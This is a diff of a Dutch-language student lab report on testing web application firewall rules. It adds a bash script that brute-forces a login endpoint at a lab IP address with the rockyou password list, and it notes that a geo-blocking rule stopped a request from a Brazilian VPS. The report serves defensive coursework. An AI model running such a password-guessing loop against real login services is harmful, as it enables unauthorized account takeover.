@@ -2,7 +2,40 @@
   ### De input die je gebruikt om de WAF-regel te testen;
 
   ```bash
-    curl -v http://example.com
+    #!/bin/bash
+
+    # Path to the wordlist
+    WORDLIST="/usr/share/wordlists/rockyou.txt"
+
+    # Target URL and email
+    URL="http://10.2.0.145/rest/user/login"
+    EMAIL="a@a.a"
+
+    # Loop through each password in the wordlist
+    while IFS= read -r PASSWORD; do
+        echo "Trying password: $PASSWORD"
+        
+        # Send the curl request
+        RESPONSE=$(curl -s -X POST "$URL" \
+            -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
+            -H 'Accept: application/json, text/plain, */*' \
+            -H 'Accept-Language: en-US,en;q=0.5' \
+            -H 'Accept-Encoding: gzip, deflate' \
+            -H 'Referer: http://10.2.0.145/' \
+            -H 'Content-Type: application/json' \
+            -H 'Origin: http://10.2.0.145' \
+            -H 'Connection: keep-alive' \
+            -H 'Cookie: language=en; welcomebanner_status=dismiss' \
+            -H 'Priority: u=0' \
+            --data-raw "{\"email\":\"$EMAIL\",\"password\":\"$PASSWORD\"}")
+
+        # Check the response for success (adjust the condition based on the application's behavior)
+        if [[ "$RESPONSE" != *"Invalid email or password"* ]]; then
+            echo "Success! Password found: $PASSWORD"
+            echo "Response: $RESPONSE"
+            break
+        fi
+    done < "$WORDLIST"
   ```
 
   ### De WAF-regel die de aanval zou moeten blokkeren;
@@ -136,13 +169,11 @@
 
   ### Een log entry (of een screenshot hiervan) van de WAF waaruit duidelijk blijkt dat er een aanval werd tegengehouden;
 
-  ![alt text](image.png)
-
-  ...
+  ![non-be_ip_blocked](non_be_ip_blocked.png)
 
   ### Een uitleg waarom de WAF-regel al dan niet werkt;
 
-  We zitten in België dus de request wordt niet geblokkeerd.
+  We hebben een VPS in Brazilie gebruikt dus de request werd geblokkeerd.
 
 # 5. Blokkeren van ‘repeat offenders’
   ### De input die je gebruikt om de WAF-regel te testen;
